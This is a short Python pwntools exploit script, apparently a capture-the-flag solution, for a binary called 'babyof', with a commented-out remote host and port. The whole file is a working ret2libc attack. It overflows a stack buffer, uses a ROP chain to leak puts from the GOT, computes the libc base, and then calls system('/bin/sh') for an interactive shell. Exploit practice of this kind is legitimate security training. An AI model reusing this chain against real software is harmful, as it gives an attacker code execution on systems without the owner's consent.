from pwn import*

#r = remote("182.116.62.85",21613)
r=process('./babyof')
elf = ELF('./babyof')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context(log_level='debug',os='linux',arch='amd64')

pop_rdi_ret     = 0x0400743
main_addr       = 0x040066B
pop_rsi_r15_ret = 0x0400741

payload = b'a'*0x40 + b'b'*8
payload += p64(pop_rdi_ret)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(main_addr)


r.recv()
r.sendline(payload)

leak = u64(r.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
libc_base = leak - libc.symbols['puts']
sys = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))



payload = b'a'*0x40 + b'b'*8
payload += p64(pop_rdi_ret)
payload += p64(binsh)
payload += p64(pop_rsi_r15_ret)
payload += p64(0)*2
payload += p64(sys)


r.recv()
r.sendline(payload)

r.interactive()